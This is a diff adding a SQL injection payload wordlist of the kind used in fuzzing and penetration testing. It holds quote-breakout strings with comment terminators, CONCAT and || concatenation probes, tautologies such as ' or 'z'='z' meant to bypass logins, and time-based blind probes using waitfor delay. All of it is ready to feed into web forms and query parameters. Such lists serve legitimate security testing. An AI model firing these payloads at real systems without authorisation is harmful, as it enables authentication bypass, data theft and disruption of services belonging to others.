@@ -1,0 +1,280 @@
+'":;/\|#$%^&*()!@~`-_+=.
+
+'
+'--
+'#
+'//
+'/*
+';--
+';#
+';//
+';/*
+
+''
+''--
+''#
+''//
+''/*
+'';--
+'';#
+'';//
+'';/*
+
+arv+ind'
+arv+ind'--
+arv+ind'#
+arv+ind'//
+arv+ind'/*
+arv+ind';--
+arv+ind';#
+arv+ind';//
+arv+ind';/*
+
+arv+ind''
+arv+ind''--
+arv+ind''#
+arv+ind''//
+arv+ind''/*
+arv+ind'';--
+arv+ind'';#
+arv+ind'';//
+arv+ind'';/*
+
+CONCAT(arv,ind,')
+CONCAT(arv,ind,'--)
+CONCAT(arv,ind,'#)
+CONCAT(arv,ind,'/*)
+CONCAT(arv,ind,';--)
+CONCAT(arv,ind,';#)
+CONCAT(arv,ind,';//)
+CONCAT(arv,ind,';/*)
+CONCAT(arv,ind,'')
+CONCAT(arv,ind,''--)
+CONCAT(arv,ind,''#)
+CONCAT(arv,ind,''//)
+CONCAT(arv,ind,''/*)
+CONCAT(arv,ind,'';--)
+CONCAT(arv,ind,'';#)
+CONCAT(arv,ind,'';//)
+CONCAT(arv,ind,'';/*)
+
+arv||ind'
+arv||ind'--
+arv||ind'#
+arv||ind'//
+arv||ind'/*
+arv||ind';--
+arv||ind';#
+arv||ind';//
+arv||ind';/*
+
+arv||ind''
+arv||ind''--
+arv||ind''#
+arv||ind''//
+arv||ind''/*
+arv||ind'';--
+arv||ind'';#
+arv||ind'';//
+arv||ind'';/*
+---
+
+valid_user'
+valid_user'--
+valid_user'#
+valid_user'//
+valid_user'/*
+valid_user';--
+valid_user';#
+valid_user';//
+valid_user';/*
+
+valid_user''
+valid_user''--
+valid_user''#
+valid_user''//
+valid_user''/*
+valid_user'';--
+valid_user'';#
+valid_user'';//
+valid_user'';/*
+
+or 100=100
+or 100=100--
+or 100=100#
+or 100=100//
+or 100=100/*
+or 100=100;--
+or 100=100;#
+or 100=100;//
+or 100=100;/*
+
+or 'z'='z'
+or 'z'='z'--
+or 'z'='z'#
+or 'z'='z'//
+or 'z'='z'/*
+or 'z'='z';--
+or 'z'='z';#
+or 'z'='z';//
+or 'z'='z';/*
+
+' or 100=100
+' or 100=100--
+' or 100=100#
+' or 100=100//
+' or 100=100/*
+' or 100=100;--
+' or 100=100;#
+' or 100=100;//
+' or 100=100;/*
+
+' or 'z'='z'
+' or 'z'='z'--
+' or 'z'='z'#
+' or 'z'='z'//
+' or 'z'='z'/*
+' or 'z'='z';--
+' or 'z'='z';#
+' or 'z'='z';//
+' or 'z'='z';/*
+
+valid_user and 100=100
+valid_user and 100=100--
+valid_user and 100=100#
+valid_user and 100=100//
+valid_user and 100=100/*
+valid_user and 100=100;--
+valid_user and 100=100;#
+valid_user and 100=100;//
+valid_user and 100=100;/*
+
+valid_user and 'z'='z'
+valid_user and 'z'='z'--
+valid_user and 'z'='z'#
+valid_user and 'z'='z'//
+valid_user and 'z'='z'/*
+valid_user and 'z'='z';--
+valid_user and 'z'='z';#
+valid_user and 'z'='z';//
+valid_user and 'z'='z';/*
+
+valid_user' and 100=100
+valid_user' and 100=100--
+valid_user' and 100=100#
+valid_user' and 100=100//
+valid_user' and 100=100/*
+valid_user' and 100=100;--
+valid_user' and 100=100;#
+valid_user' and 100=100;//
+valid_user' and 100=100;/*
+
+valid_user' and 'z'='z'
+valid_user' and 'z'='z'--
+valid_user' and 'z'='z'#
+valid_user' and 'z'='z'//
+valid_user' and 'z'='z'/*
+valid_user' and 'z'='z';--
+valid_user' and 'z'='z';#
+valid_user' and 'z'='z';//
+valid_user' and 'z'='z';/*
+
+or+100=100
+or+100=100--
+or+100=100#
+or+100=100//
+or+100=100/*
+or+100=100;--
+or+100=100;#
+or+100=100;//
+or+100=100;/*
+
+or+'z'='z'
+or+'z'='z'--
+or+'z'='z'#
+or+'z'='z'//
+or+'z'='z'/*
+or+'z'='z';--
+or+'z'='z';#
+or+'z'='z';//
+or+'z'='z';/*
+
+'+or+100=100
+'+or+100=100--
+'+or+100=100#
+'+or+100=100//
+'+or+100=100/*
+'+or+100=100;--
+'+or+100=100;#
+'+or+100=100;//
+'+or+100=100;/*
+
+'+or+'z'='z'
+'+or+'z'='z'--
+'+or+'z'='z'#
+'+or+'z'='z'//
+'+or+'z'='z'/*
+'+or+'z'='z';--
+'+or+'z'='z';#
+'+or+'z'='z';//
+'+or+'z'='z';/*
+
+valid_user+and+100=100
+valid_user+and+100=100--
+valid_user+and+100=100#
+valid_user+and+100=100//
+valid_user+and+100=100/*
+valid_user+and+100=100;--
+valid_user+and+100=100;#
+valid_user+and+100=100;//
+valid_user+and+100=100;/*
+
+valid_user+and+'z'='z'
+valid_user+and+'z'='z'--
+valid_user+and+'z'='z'#
+valid_user+and+'z'='z'//
+valid_user+and+'z'='z'/*
+valid_user+and+'z'='z';--
+valid_user+and+'z'='z';#
+valid_user+and+'z'='z';//
+valid_user+and+'z'='z';/*
+
+valid_user'+and+100=100
+valid_user'+and+100=100--
+valid_user'+and+100=100#
+valid_user'+and+100=100//
+valid_user'+and+100=100/*
+valid_user'+and+100=100;--
+valid_user'+and+100=100;#
+valid_user'+and+100=100;//
+valid_user'+and+100=100;/*
+
+valid_user'+and+'z'='z'
+valid_user'+and+'z'='z'--
+valid_user'+and+'z'='z'#
+valid_user'+and+'z'='z'//
+valid_user'+and+'z'='z'/*
+valid_user'+and+'z'='z';--
+valid_user'+and+'z'='z';#
+valid_user'+and+'z'='z';//
+valid_user'+and+'z'='z';/*
+
+' waitfor delay '00:00:10'
+' waitfor delay '00:00:10'--
+' waitfor delay '00:00:10'#
+' waitfor delay '00:00:10'//
+' waitfor delay '00:00:10'/*
+' waitfor delay '00:00:10';--
+' waitfor delay '00:00:10';#
+' waitfor delay '00:00:10';//
+' waitfor delay '00:00:10';/*
+
+'+waitfor+delay+'00:00:10'
+'+waitfor+delay+'00:00:10'--
+'+waitfor+delay+'00:00:10'#
+'+waitfor+delay+'00:00:10'//
+'+waitfor+delay+'00:00:10'/*
+'+waitfor+delay+'00:00:10';--
+'+waitfor+delay+'00:00:10';#
+'+waitfor+delay+'00:00:10';//
+'+waitfor+delay+'00:00:10';/*
